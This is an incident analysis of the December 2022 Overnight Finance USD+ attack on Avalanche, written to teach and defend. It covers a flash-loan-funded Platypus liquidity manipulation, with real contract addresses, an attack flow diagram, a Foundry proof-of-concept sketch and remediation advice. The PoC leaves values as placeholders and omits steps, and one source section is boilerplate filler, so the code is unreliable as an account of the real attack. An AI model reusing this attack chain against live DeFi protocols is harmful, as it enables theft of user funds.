# Overnight — USD+ Platypus Liquidity Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-12 |
| **Protocol** | Overnight Finance (USD+) |
| **Chain** | Avalanche |
| **Loss** | Unconfirmed |
| **USD+ Token** | [0x73cb180bf0521828d8849bc8CF2B920918e23032](https://snowtrace.io/address/0x73cb180bf0521828d8849bc8CF2B920918e23032) |
| **USDC.e** | [0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664](https://snowtrace.io/address/0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664) |
| **Platypus SwapFlashLoan** | [0xED2a7edd7413021d440b09D654f3b87712abAB66](https://snowtrace.io/address/0xED2a7edd7413021d440b09D654f3b87712abAB66) |
| **Platypus Finance** | [0x66357dCaCe80431aee0A7507e2E361B7e2402370](https://snowtrace.io/address/0x66357dCaCe80431aee0A7507e2E361B7e2402370) |
| **Aave V2** | [0x4F01AeD16D97E3aB5ab2B501154DC9bb0F1A5A2C](https://snowtrace.io/address/0x4F01AeD16D97E3aB5ab2B501154DC9bb0F1A5A2C) |
| **Aave V3** | [0x794a61358D6845594F94dc1DB02A252b5b4814aD](https://snowtrace.io/address/0x794a61358D6845594F94dc1DB02A252b5b4814aD) |
| **Benqi Finance** | [0x486Af39519B4Dc9a7fCcd318217352830E8AD9b4](https://snowtrace.io/address/0x486Af39519B4Dc9a7fCcd318217352830E8AD9b4) |
| **qiUSDCn** | [0xB715808a78F6041E46d61Cb123C9B4A27056AE9C](https://snowtrace.io/address/0xB715808a78F6041E46d61Cb123C9B4A27056AE9C) |
| **Joe Router** | [0x60aE616a2155Ee3d9A68541Ba4544862310933d4](https://snowtrace.io/address/0x60aE616a2155Ee3d9A68541Ba4544862310933d4) |
| **Root Cause** | Reserve imbalance created via repeated add/remove liquidity cycles on the Platypus stableswap pool, combined with the USD+ `buy()`/`redeem()` mechanism and Benqi oracle manipulation to realize arbitrage profits |
| **CWE** | CWE-840: Business Logic Error |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/Overnight_exp.sol) |

---
## 1. Vulnerability Overview

Overnight Finance's USD+ was a stablecoin exchangeable for USDC.e via the Platypus stableswap pool on Avalanche. The attacker took out a large USDC.e flash loan (worth millions of dollars) from Aave V2 and activated a nested Aave V3 flash loan. The borrowed funds were deposited as collateral in Benqi (qiUSDCn) to manipulate the oracle price and borrow additional USDC.e. The attacker then maximized reserve imbalance through repeated add/remove liquidity cycles on the Platypus pool, and drained the pool balance via USDC.e → nUSD → DAI.e → USDT.e swaps under the imbalanced state. Arbitrage profits in USDC.e were realized through nUSD → USD+ exchange via USD+ `buy()` and reverse swaps.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable Platypus stableswap — allows imbalanced add/remove
contract PlatypusPool {
    // ❌ Allows immediate removal after imbalanced liquidity addition
    // → Enables favorable swap execution after distorting reserve ratio
    function addLiquidity(
        address token,
        uint256 amount,
        uint256 minimumLiquidity,
        address to,
        uint256 deadline
    ) external returns (uint256 liquidity) {
        // ❌ Allows imbalanced addition relative to current pool ratio
        _transferIn(token, amount);
        liquidity = _calculateLiquidity(token, amount);
        _mint(to, liquidity);
    }

    function removeLiquidity(
        address token,
        uint256 liquidity,
        uint256 minimumAmount,
        address to,
        uint256 deadline
    ) external returns (uint256 amount) {
        // ❌ Allows immediate removal of imbalanced liquidity
        // → Returns tokens with a distorted ratio upon removal
        _burn(msg.sender, liquidity);
        amount = _calculateAmount(token, liquidity);
        _transferOut(token, to, amount);
    }
}

// ✅ Correct pattern — liquidity lock period + imbalance restriction
contract SafePlatypusPool {
    mapping(address => uint256) public liquidityAddTime;

    function addLiquidity(address token, uint256 amount, ...) external returns (uint256) {
        // ✅ Validates minimum ratio maintenance
        require(_checkBalanceRatio(token, amount), "Imbalanced add");
        liquidityAddTime[msg.sender] = block.timestamp;
        // ...
    }

    function removeLiquidity(address token, uint256 liquidity, ...) external returns (uint256) {
        // ✅ Requires minimum waiting period after liquidity addition
        require(block.timestamp >= liquidityAddTime[msg.sender] + MIN_LOCK_TIME,
            "Lock period not ended");
        // ...
    }
}
```


### On-Chain Source Code

Source: Source unconfirmed

> ⚠️ No on-chain source code — only bytecode exists or source is unverified

**Vulnerable function** — `buy()`:
```solidity
// ❌ Root cause: Reserve imbalance created via repeated add/remove liquidity cycles on the Platypus stableswap pool,
//    combined with the USD+ `buy()`/`redeem()` mechanism and Benqi oracle manipulation to realize arbitrage profits
// Source code unconfirmed — bytecode analysis required
// Vulnerability: Reserve imbalance created via repeated add/remove liquidity cycles on the Platypus stableswap pool,
//                combined with the USD+ `buy()`/`redeem()` mechanism and Benqi oracle manipulation to realize arbitrage profits
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Aave V2 flash loan: large amount of USDC.e
    │
    ├─[2] Activate Aave V3 nested flash loan
    │
    ├─[3] USDC.e → qiUSDCn (Benqi) collateral deposit
    │       Enter Benqi market
    │
    ├─[4] Benqi oracle manipulation → borrow additional USDC.e
    │       Overborrow USDC.e from qiUSDC
    │
    ├─[5] Repeated add/remove liquidity on Platypus pool
    │       Distort reserves via imbalanced liquidity
    │
    ├─[6] USDC.e → nUSD swap (exploiting Platypus imbalance)
    │
    ├─[7] nUSD → DAI.e → USDT.e swaps (pool drain)
    │       Favorable exchange at manipulated ratio
    │
    ├─[8] USD+ buy() → nUSD→USD+ exchange
    │       Acquire USD+
    │
    ├─[9] nUSD/DAI.e/USDT.e → USDC.e reverse swaps
    │       Recover USDC.e at favorable ratio
    │
    ├─[10] Repay Benqi borrow + withdraw qiUSDCn
    │
    ├─[11] Swap Platypus profits to USDC.e
    │
    ├─[12] Repay Aave V3 flash loan
    │
    ├─[13] Repay Aave V2 flash loan
    │
    └─[14] Net profit: USDC.e arbitrage gains
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IUSDPlus {
    function buy(address asset, uint256 amount) external returns (uint256);
    function redeem(address asset, uint256 amount) external returns (uint256);
}

interface IPlatypus {
    function deposit(address token, uint256 amount, address to, uint256 deadline)
        external returns (uint256);
    function withdraw(address token, uint256 liquidity, uint256 minimumAmount,
        address to, uint256 deadline) external returns (uint256);
    function swap(address fromToken, address toToken, uint256 fromAmount,
        uint256 minimumToAmount, address to, uint256 deadline)
        external returns (uint256, uint256);
}

interface ISwapFlashLoan {
    function flashLoan(
        address receiver, address token, uint256 amount, bytes calldata params
    ) external;
}

interface IAaveFlashloan {
    function flashLoan(
        address receiver, address[] calldata assets, uint256[] calldata amounts,
        uint256[] calldata modes, address onBehalfOf, bytes calldata params, uint16 referral
    ) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract OvernightExploit is Test {
    IERC20        USDCe    = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);
    IUSDPlus      usdPlus  = IUSDPlus(0x73cb180bf0521828d8849bc8CF2B920918e23032);
    IPlatypus     platypus = IPlatypus(0x66357dCaCe80431aee0A7507e2E361B7e2402370);
    ISwapFlashLoan flashLoan = ISwapFlashLoan(0xED2a7edd7413021d440b09D654f3b87712abAB66);
    IAaveFlashloan aaveV2  = IAaveFlashloan(0x4F01AeD16D97E3aB5ab2B501154DC9bb0F1A5A2C);

    function setUp() public {
        vm.createSelectFork("avax");
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] USDC.e", USDCe.balanceOf(address(this)), 6);

        // [Step 1] Aave V2 large flash loan
        address[] memory assets = new address[](1);
        assets[0] = address(USDCe);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = USDCe.balanceOf(/* avUSDC */address(0));
        uint256[] memory modes = new uint256[](1);
        aaveV2.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);

        emit log_named_decimal_uint("[End] USDC.e", USDCe.balanceOf(address(this)), 6);
    }

    function executeOperation(
        address[] calldata, uint256[] calldata amounts,
        uint256[] calldata premiums, address, bytes calldata
    ) external returns (bool) {
        USDCe.approve(address(platypus), type(uint256).max);

        // [Step 5] Platypus repeated add/remove liquidity — create reserve imbalance
        for (uint256 i = 0; i < 5; i++) {
            // ⚡ Imbalanced liquidity addition + immediate removal → reserve distortion
            platypus.deposit(address(USDCe), amounts[0] / 10, address(this), block.timestamp);
            platypus.withdraw(address(USDCe), /* lpAmount */0, 0, address(this), block.timestamp);
        }

        // [Steps 6–7] Favorable swaps against imbalanced reserves
        platypus.swap(
            address(USDCe), /* nUSD */address(0),
            USDCe.balanceOf(address(this)) / 3, 0, address(this), block.timestamp
        );

        // [Step 8] Buy USD+
        USDCe.approve(address(usdPlus), type(uint256).max);
        usdPlus.buy(address(USDCe), USDCe.balanceOf(address(this)) / 4);

        // [Step 9] Recover USDC.e via reverse swaps
        // ... nUSD → USDC.e, DAI.e → USDC.e, etc. ...

        // Repay Aave V2 flash loan
        USDCe.approve(address(aaveV2), amounts[0] + premiums[0]);
        return true;
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Platypus repeated add/remove liquidity reserve imbalance + USD+ price manipulation |
| **CWE** | CWE-840: Business Logic Error |
| **OWASP DeFi** | AMM reserve manipulation + composite DeFi vulnerability |
| **Attack Vector** | Aave V2/V3 multiple flash loans → Benqi oracle manipulation → Platypus repeated add/remove → USD+ buy/redeem arbitrage |
| **Preconditions** | Platypus allows immediate imbalanced add/remove; USD+ price depends on Platypus spot ratio |
| **Impact** | USDC.e arbitrage profits (scale unconfirmed) |

---
## 6. Remediation Recommendations

1. **Liquidity lock period**: Prohibit liquidity removal for at least 1 block after addition to prevent immediate add/remove cycles within a flash loan.
2. **Imbalanced liquidity restriction**: Restrict or apply additional fees to liquidity additions that significantly deviate from the current pool ratio.
3. **USD+ price oracle hardening**: Set the USD+ to USDC.e exchange rate based on TWAP or an external oracle rather than the Platypus spot price.
4. **Flash loan detection**: Add an emergency pause mechanism that detects and blocks the pattern of flash loan + liquidity manipulation + USD+ exchange within the same transaction.

---
## 7. Lessons Learned

- **Repeated liquidity attacks on stableswap AMMs**: Stableswap pools like Platypus are more sensitive to reserve imbalance than general AMMs. Allowing immediate add/remove cycles enables reserve distortion within a single transaction.
- **Composite protocol attack chain**: This was a four-stage composite attack chaining Aave (flash loan) → Benqi (oracle manipulation) → Platypus (reserve manipulation) → USD+ (price arbitrage). Each protocol may be individually secure, yet their combination creates new attack surfaces.
- **Stablecoin price stability assumptions**: USD+ assumed that its exchange ratio on the Platypus pool would remain close to 1:1, but this assumption could be broken through pool reserve manipulation. Stablecoin protocols must independently verify the manipulation resistance of their underlying pools.